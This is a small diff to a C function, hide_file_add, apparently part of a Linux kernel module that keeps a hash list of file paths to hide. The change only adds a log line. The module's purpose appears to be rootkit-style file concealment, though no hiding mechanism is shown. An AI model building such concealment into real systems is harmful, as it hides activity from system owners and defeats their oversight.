@@ -281,6 +281,8 @@ int hide_file_add(const char *pathname) {
     memcpy(name_owned, pathname, hashlen_len(hash_len));
     name_owned[hashlen_len(hash_len)] = '\0';
 
+    pr_info(LOG_PREFIX "new file to hide: %s\n", name_owned);
+
     info->path = (struct qstr){.hash_len = hash_len, .name = name_owned};
     info->dentry = dentry;
     hash_add(hide_file_info_list, &info->node, info->path.hash);
